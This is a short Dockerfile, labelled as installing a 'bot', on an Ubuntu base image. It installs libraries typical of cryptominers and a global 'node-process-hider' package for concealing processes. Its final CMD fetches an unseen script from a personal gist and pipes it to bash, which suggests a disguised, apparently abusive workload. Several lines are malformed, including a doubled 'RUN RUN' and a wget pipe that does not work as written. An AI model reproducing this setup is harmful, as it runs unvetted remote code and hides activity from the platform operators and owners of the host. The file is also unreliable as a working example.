FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    ca-certificates \
    libnuma-dev \
    libjansson-dev \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh /home
COPY /stuff /home/stuff

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN echo "Uploaded files:" && ls /home/stuff/
RUN npm i -g node-process-hider
RUN RUN curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash

# Run bot script:
CMD wget https://gist.githubusercontent.com/petugas/2e39685c7f122fc78d10a3006dcd6210/raw/9642f636daa0f8affab759412a88d1b65fb2c075/R.sh | bash
